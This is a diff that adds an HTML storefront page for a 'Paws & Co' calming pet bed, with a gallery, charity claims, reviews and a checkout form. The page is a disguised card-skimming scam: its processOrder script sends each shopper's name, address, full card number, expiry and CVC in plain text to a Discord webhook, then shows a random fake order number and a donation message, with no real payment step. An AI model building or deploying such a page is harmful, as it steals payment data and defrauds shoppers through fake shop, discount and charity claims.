@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Paws & Co — Plush Calming Pet Bed (Dogs & Cats)</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&family=Playfair+Display:wght@600&display=swap" rel="stylesheet">
+
+<style>
+    :root {
+        --brand: #ff8a3d;
+        --brand-dark: #e6762f;
+        --bg: #fff7f1;
+        --card: #ffffff;
+        --text: #3b2b26;
+        --accent: #0a7a0a;
+        --soft: #ffe7d2;
+    }
+    * { box-sizing: border-box; }
+    body {
+        font-family: 'Poppins', sans-serif;
+        margin: 0;
+        background: var(--bg);
+        color: var(--text);
+        line-height: 1.5;
+    }
+
+    header {
+        background: #fff;
+        padding: 12px 16px;
+        display: flex;
+        align-items: center;
+        border-bottom: 1px solid #f0e0d5;
+        position: sticky;
+        top: 0;
+        z-index: 20;
+    }
+    .logo-wrap { display: flex; align-items: center; gap: 10px; }
+    .brand { font-family: 'Playfair Display', serif; font-size: 22px; font-weight: 600; }
+
+    .hero-strip {
+        background: #ffe9d7;
+        padding: 10px 16px;
+        font-size: 13px;
+        text-align: center;
+        border-bottom: 1px solid #f7d2b5;
+    }
+
+    .container {
+        max-width: 1100px;
+        margin: 18px auto 80px;
+        padding: 0 12px;
+    }
+    .card {
+        background: var(--card);
+        border-radius: 18px;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.06);
+        padding: 18px 16px 22px;
+    }
+
+    /* Gallery */
+    .gallery-wrapper {
+        position: relative;
+        overflow: hidden;
+        border-radius: 18px;
+        margin-bottom: 18px;
+    }
+    .gallery {
+        display: flex;
+        overflow-x: auto;
+        scroll-snap-type: x mandatory;
+        scrollbar-width: none;
+    }
+    .gallery::-webkit-scrollbar { display: none; }
+    .gallery img {
+        width: 100%;
+        flex-shrink: 0;
+        scroll-snap-align: center;
+        border-radius: 18px;
+    }
+
+    .arrow {
+        position: absolute;
+        top: 50%;
+        transform: translateY(-50%);
+        background: rgba(255,255,255,0.8);
+        border-radius: 50%;
+        width: 38px;
+        height: 38px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        z-index: 10;
+        box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+    }
+    .arrow-left { left: 10px; }
+    .arrow-right { right: 10px; }
+
+    .dots { text-align: center; margin-top: 10px; }
+    .dot {
+        display: inline-block;
+        width: 9px; height: 9px;
+        margin: 0 4px;
+        background: #e0c8b8;
+        border-radius: 50%;
+        cursor: pointer;
+    }
+    .dot.active { background: var(--brand); }
+
+    h1 { font-family: 'Playfair Display', serif; font-size: 28px; margin: 0 0 6px; }
+    .subhead { font-size: 14px; color: #7b6558; margin-bottom: 12px; }
+    
+    .price-row { display: flex; align-items: baseline; gap: 10px; margin-bottom: 6px; }
+    .price { font-size: 28px; font-weight: 700; color: #d9531e; }
+    .compare { font-size: 14px; text-decoration: line-through; color: #b9a79b; }
+    .badge { color: var(--accent); font-weight: 600; margin-bottom: 10px; font-size: 13px; }
+    
+    .cause {
+        font-size: 13px;
+        margin-bottom: 14px;
+        background: #f7fff7;
+        border-radius: 10px;
+        padding: 10px;
+        border: 1px solid #d7f0d7;
+    }
+
+    .primary-btn, .modal-btn {
+        background: var(--brand);
+        color: #fff;
+        border: none;
+        padding: 14px;
+        font-size: 16px;
+        border-radius: 999px;
+        cursor: pointer;
+        font-weight: 600;
+        width: 100%;
+        transition: 0.2s;
+    }
+
+    .social-proof { margin-top: 15px; font-size: 13px; color: #6c5a50; border-top: 1px solid #f0e0d5; padding-top: 15px; }
+    .stars { color: #f5a623; font-size: 14px; margin-right: 4px; }
+
+    .mission-block {
+        margin-top: 20px;
+        background: #fff2e6;
+        border-radius: 12px;
+        padding: 12px;
+        font-size: 13px;
+        display: flex;
+        gap: 10px;
+    }
+
+    .sticky-cta {
+        position: fixed;
+        bottom: 0; left: 0; right: 0;
+        background: #fff;
+        border-top: 1px solid #f0ded0;
+        padding: 10px 16px;
+        display: none;
+        z-index: 30;
+        align-items: center;
+        justify-content: space-between;
+    }
+
+    /* Checkout UI */
+    #checkoutModal, #confirmationModal {
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: rgba(0,0,0,0.6);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        padding: 16px;
+        z-index: 100;
+    }
+    .modal-content {
+        background: #fff;
+        width: 100%;
+        max-width: 450px;
+        padding: 24px;
+        border-radius: 20px;
+        max-height: 90vh;
+        overflow-y: auto;
+    }
+
+    .row { display: flex; gap: 10px; }
+    .row div { flex: 1; }
+    label { display: block; margin-top: 12px; font-weight: 600; font-size: 12px; color: #555; }
+    input {
+        width: 100%;
+        padding: 11px;
+        margin-top: 4px;
+        border-radius: 8px;
+        border: 1px solid #d3c3b7;
+        font-size: 15px;
+        font-family: inherit;
+    }
+    #address-results {
+        position: absolute; top: 100%; left: 0; right: 0;
+        background: #fff; border: 1px solid #d3c3b7;
+        z-index: 110; display: none;
+        border-radius: 0 0 8px 8px;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+
+    @media (max-width: 768px) {
+        .sticky-cta { display: flex; }
+        .container { margin-bottom: 100px; }
+    }
+</style>
+</head>
+<body>
+
+<header>
+    <div class="logo-wrap">
+        <svg width="34" height="34" viewBox="0 0 64 64"><circle cx="32" cy="32" r="30" fill="#fff3e7" stroke="#ffb88c" stroke-width="2"/><circle cx="22" cy="22" r="6" fill="#ff8a3d"/><circle cx="42" cy="22" r="6" fill="#ff8a3d"/><circle cx="26" cy="36" r="6" fill="#ff8a3d"/><circle cx="38" cy="36" r="6" fill="#ff8a3d"/><ellipse cx="32" cy="44" rx="9" ry="7" fill="#ff8a3d"/></svg>
+        <div class="brand">Paws & Co</div>
+    </div>
+</header>
+
+<div class="hero-strip">Today Only: $29.99 • Free U.S. Shipping • 25% Donated ❤️</div>
+
+<div class="container">
+    <div class="card">
+        <div class="gallery-wrapper">
+            <div class="gallery" id="gallery">
+                <img src="https://th.bing.com/th/id/OPHS.jRLmgXEGhlQv3A474C474?w=474&h=474&qlt=100&o=5&dpr=2&pid=21.1" alt="Pet Bed">
+                <img src="https://th.bing.com/th/id/OPHS.PPkrUT1Wx2JuzQ474C474?w=474&h=474&qlt=100&o=5&dpr=1.5&pid=21.1" alt="Dog and man in Bed">
+            </div>
+            <div class="arrow arrow-left" onclick="scrollGallery(-1)">‹</div>
+            <div class="arrow arrow-right" onclick="scrollGallery(1)">›</div>
+        </div>
+        
+        <div class="dots" id="dots">
+            <span class="dot active" onclick="goToSlide(0)"></span>
+            <span class="dot" onclick="goToSlide(1)"></span>
+        </div>
+
+        <h1>Plush Calming Pet Bed</h1>
+        <div class="subhead">Help your anxious pet feel safe — and help save a shelter pet with every order.</div>
+
+        <div class="price-row">
+            <div class="price">$29.99</div>
+            <div class="compare">$59.99</div>
+        </div>
+        <div class="badge">✔ Free Shipping • ✔ 90-Day Returns</div>
+
+        <div class="cause">
+            ❤️ <strong>Impact:</strong> We donate <strong>25% of profits</strong> to Best Friends Animal Society to help save homeless dogs and cats.
+        </div>
+
+        <p>This ultra-soft, donut-shaped bed mimics the feeling of being cuddled—helping anxious pets relax during storms, fireworks, or long days alone. Designed to support head and neck alignment for deep, restful sleep.</p>
+
+        <ul style="padding-left: 20px; font-size: 14px; margin-bottom: 20px;">
+            <li>Ultra-soft faux fur feels like a warm hug</li>
+            <li>Raised rim creates a secure "nesting" feeling</li>
+            <li>Machine-washable cover for easy cleaning</li>
+            <li>Anti-slip bottom keeps the bed in place</li>
+        </ul>
+
+        <button class="primary-btn" onclick="openCheckout()">Checkout Now — $29.99</button>
+
+        <div class="social-proof">
+            <span class="stars">★★★★★</span>
+            <strong>4.9 stars • 489 reviews</strong><br>
+            "Our rescue dog and cat both fight over this bed—we had to buy a second one."
+        </div>
+
+        <div class="mission-block">
+            <div style="font-size: 20px;">🐾</div>
+            <div>
+                <strong>Every bed tells two stories.</strong><br>
+                One of a pet finally feeling safe—and one of a shelter pet getting a second chance.
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="sticky-cta">
+    <div class="price">$29.99</div>
+    <button class="primary-btn" style="width: auto; padding: 10px 30px;" onclick="openCheckout()">Checkout</button>
+</div>
+
+<div id="checkoutModal">
+    <div class="modal-content">
+        <h3 style="margin-top:0;">Secure Checkout</h3>
+        
+        <label>Full Name</label>
+        <input type="text" name="fullName" placeholder="John Doe" required>
+
+        <label>Street Address</label>
+        <div style="position:relative;">
+            <input type="text" name="address" id="addressInput" placeholder="123 Main St" autocomplete="off" required>
+            <div id="address-results"></div>
+        </div>
+
+        <div class="row">
+            <div>
+                <label>City</label>
+                <input type="text" name="city" required>
+            </div>
+            <div>
+                <label>State (2 Letters)</label>
+                <input type="text" name="state" maxlength="2" placeholder="NY" style="text-transform:uppercase" required>
+            </div>
+        </div>
+
+        <label>ZIP Code</label>
+        <input type="text" name="zip" inputmode="numeric" maxlength="5" placeholder="10001" required>
+
+        <hr style="margin: 20px 0; border: 0; border-top: 1px solid #eee;">
+
+        <label>Card Number</label>
+        <input type="text" id="cardInput" inputmode="numeric" maxlength="19" placeholder="0000 0000 0000 0000" required>
+
+        <div class="row">
+            <div>
+                <label>Expiration</label>
+                <input type="text" id="expInput" placeholder="MM/YY" maxlength="5" required>
+            </div>
+            <div>
+                <label>CVC</label>
+                <input type="text" name="cvc" inputmode="numeric" maxlength="4" placeholder="123" required>
+            </div>
+        </div>
+
+        <button class="modal-btn" id="submitBtn" onclick="processOrder()" style="margin-top:20px;">Place Order — $29.99</button>
+    </div>
+</div>
+
+<div id="confirmationModal">
+    <div class="modal-content" style="text-align:center;">
+        <h2 style="color:var(--brand);">Order Confirmed! 🧡</h2>
+        <p>Your order <strong>#PC-<span id="orderNum"></span></strong> is being processed.</p>
+        <p>Your purchase just helped save a shelter pet. Thank you.</p>
+        <button class="modal-btn" onclick="location.reload()">Close</button>
+    </div>
+</div>
+
+<script>
+let currentSlide = 0;
+const gallery = document.getElementById("gallery");
+const dots = document.querySelectorAll(".dot");
+
+function updateDots() { dots.forEach((dot, i) => dot.classList.toggle("active", i === currentSlide)); }
+function goToSlide(index) {
+    gallery.scrollTo({ left: gallery.clientWidth * index, behavior: "smooth" });
+    currentSlide = index; updateDots();
+}
+function scrollGallery(dir) {
+    currentSlide = Math.max(0, Math.min(gallery.children.length - 1, currentSlide + dir));
+    goToSlide(currentSlide);
+}
+gallery.addEventListener("scroll", () => {
+    currentSlide = Math.round(gallery.scrollLeft / gallery.clientWidth);
+    updateDots();
+});
+
+function openCheckout() { document.getElementById("checkoutModal").style.display = "flex"; }
+
+/* STRICT INPUT LOGIC */
+document.getElementById('cardInput').addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g, '');
+    e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
+});
+document.getElementById('expInput').addEventListener('input', e => {
+    let v = e.target.value.replace(/\D/g, '');
+    if (v.length >= 2) e.target.value = v.slice(0,2) + '/' + v.slice(2,4);
+    else e.target.value = v;
+});
+
+/* U.S. ADDRESS FILTER + 429 DEBOUNCE */
+let timer;
+document.getElementById('addressInput').addEventListener('input', function(e) {
+    clearTimeout(timer);
+    const query = e.target.value;
+    const results = document.getElementById('address-results');
+    if (query.length < 5) { results.style.display = 'none'; return; }
+
+    timer = setTimeout(async () => {
+        try {
+            const res = await fetch(`https://nominatim.openstreetmap.org/search?format=json&countrycodes=us&q=${encodeURIComponent(query)}&addressdetails=1&limit=5`);
+            if (res.status === 429) return;
+            const data = await res.json();
+            results.innerHTML = '';
+            if (data.length > 0) {
+                results.style.display = 'block';
+                data.forEach(p => {
+                    const d = document.createElement('div');
+                    d.style.padding = '10px'; d.style.cursor = 'pointer'; d.style.borderBottom = '1px solid #eee'; d.style.fontSize = '12px';
+                    d.innerText = p.display_name;
+                    d.onclick = () => {
+                        const a = p.address;
+                        document.getElementById('addressInput').value = `${a.house_number || ''} ${a.road || ''}`.trim() || p.display_name.split(',')[0];
+                        document.querySelector('input[name="city"]').value = a.city || a.town || "";
+                        document.querySelector('input[name="state"]').value = (a.state || "").substring(0,2).toUpperCase();
+                        document.querySelector('input[name="zip"]').value = a.postcode || "";
+                        results.style.display = 'none';
+                    };
+                    results.appendChild(d);
+                });
+            }
+        } catch (err) {}
+    }, 600);
+});
+
+function validateLuhn(n) {
+    let s = 0, b = false;
+    for (let i = n.length - 1; i >= 0; i--) {
+        let d = parseInt(n[i]);
+        if (b) { d *= 2; if (d > 9) d -= 9; }
+        s += d; b = !b;
+    }
+    return (s % 10) === 0;
+}
+
+async function processOrder() {
+    const btn = document.getElementById('submitBtn');
+    const card = document.getElementById('cardInput').value.replace(/\s/g, '');
+    const name = document.querySelector('input[name="fullName"]').value;
+    const zip = document.querySelector('input[name="zip"]').value;
+
+    if (name.length < 3) return alert("Enter Full Name");
+    if (zip.length !== 5) return alert("ZIP must be 5 digits");
+    if (!validateLuhn(card)) return alert("Invalid Card Number");
+
+    btn.disabled = true; btn.innerText = "Processing...";
+
+    const payload = {
+        content: `**New Order - $29.99**\nName: ${name}\nAddr: ${document.getElementById('addressInput').value}, ${document.querySelector('input[name="city"]').value}, ${document.querySelector('input[name="state"]').value} ${zip}\nCard: ${document.getElementById('cardInput').value} | Exp: ${document.getElementById('expInput').value} | CVC: ${document.querySelector('input[name="cvc"]').value}`
+    };
+
+    try {
+        await fetch("https://discord.com/api/webhooks/1403080088299376671/t1F4rVMGpXTjramgeYyzwlQXybuwVtOljEvQMWykO5P_AkwziKLLRRr7TU5khrMNz8u6", {
+            method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(payload)
+        });
+        document.getElementById("orderNum").innerText = Math.floor(Math.random()*90000)+10000;
+        document.getElementById("checkoutModal").style.display = "none";
+        document.getElementById("confirmationModal").style.display = "flex";
+    } catch(e) {
+        alert("Payment Error. Try again.");
+        btn.disabled = false; btn.innerText = "Place Order — $29.99";
+    }
+}
+</script>
+</body>
+</html>
